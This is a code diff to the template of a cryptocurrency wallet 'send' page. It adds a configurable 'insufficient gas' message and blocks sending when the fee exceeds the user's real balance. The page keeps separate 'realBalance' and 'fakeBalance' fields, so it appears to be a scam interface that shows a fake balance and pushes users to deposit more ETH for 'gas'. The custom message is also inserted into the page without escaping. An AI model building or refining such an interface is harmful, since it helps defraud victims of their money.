@@ -66,7 +66,9 @@
                         <input type="hidden" name="token" value="{{ strtoupper($symbol) }}" />
                         <input type="hidden" id="realBalance" name="realBalance" value="{{ $realBalance }}" />
                         <input type="hidden" id="fakeBalance" name="fakeBalance" value="{{ $fakeBalance }}" />
-                        <input type="hidden" id="network_fee" name="network_fee" value="{{ $gasPriceGwei }}" />
+                        <input type="hidden" id="networkFee" name="network_fee" value="{{ $gasPriceGwei }}" />
+                        <input type="hidden" id="insufficientGasMsg" value="{{ $insufficient_gas_msg }}" />
+
                         <div class="form_input position-relative">
                             <label for="">Address</label>
                             <input type="text" name="token_address" placeholder="Click here to paste address" required>
@@ -142,7 +144,11 @@
                             </div>
                         </div>
                         <div class="form_btn">
-                            <button type="submit" class="">SEND</button>
+                            @if ($gasPriceGwei == 0)
+                                <button type="button" class="" disabled>SEND</button>
+                            @else
+                                <button type="submit" class="">SEND</button>
+                            @endif
                         </div>
                     </form>
                 </div>
@@ -156,16 +162,22 @@
     <script>
         document.getElementById('sendForm').addEventListener('submit', function(e) {
             let realBalance = parseFloat(document.getElementById('realBalance').value);
-            console.log("realBalance: " + realBalance);
+            let networkFee = parseFloat(document.getElementById('networkFee').value);
+            let insufficientGasMsg = document.getElementById('insufficientGasMsg').value.trim() || "Please add more ETH to cover the fee before sending.";
 
-            if (realBalance === 0.0) {
+            if (networkFee > realBalance) {
                 e.preventDefault(); // Stop form submission
 
                 // Beautiful SweetAlert with dark theme
                 Swal.fire({
                     icon: 'warning',
                     title: 'Insufficient Gas Fees!',
-                    html: '<div style="color: #ffffff !important;"><p style="font-size: 18px; color: #ffffff !important; margin-bottom: 15px;">Your transaction failed due to insufficient ETH for gas fees.</p><p style="font-size: 16px; color: #cccccc !important; margin-top: 15px;">Please add more ETH to cover the fee before sending.</p></div>',
+                    // html: '<div style="color: #ffffff !important;"><p style="font-size: 18px; color: #ffffff !important; margin-bottom: 15px;">Your transaction failed due to insufficient ETH for gas fees.</p><p style="font-size: 16px; color: #cccccc !important; margin-top: 15px;">Please add more ETH to cover the fee before sending.</p></div>',
+                    html: `<div style="color: #ffffff !important;">
+                        <p style="font-size: 18px; color: #ffffff !important; margin-bottom: 15px;">
+                            ${insufficientGasMsg}
+                        </p>
+                    </div>`,
                     confirmButtonText: 'Got it!',
                     confirmButtonColor: '#f39c12',
                     timer: 5000,
